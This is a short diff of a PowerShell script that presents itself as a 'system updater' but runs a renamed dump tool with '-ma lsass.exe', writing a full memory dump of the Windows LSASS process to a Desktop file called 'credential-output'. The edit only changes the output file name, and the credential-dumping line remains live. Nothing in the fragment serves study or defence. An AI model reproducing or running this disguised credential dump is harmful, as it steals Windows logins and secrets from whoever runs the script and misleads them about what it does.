@@ -38,7 +38,7 @@ try {
 }
 
 try {
-    & $desktopPath -accepteula -ma lsass.exe ([System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "credential-output.txt"))
+    & $desktopPath -accepteula -ma lsass.exe ([System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "credential-output"))
     Write-Output "system updater outputting requested files."
 } catch {
     Write-Output "Failed to execute systemupdater.exe: $_"
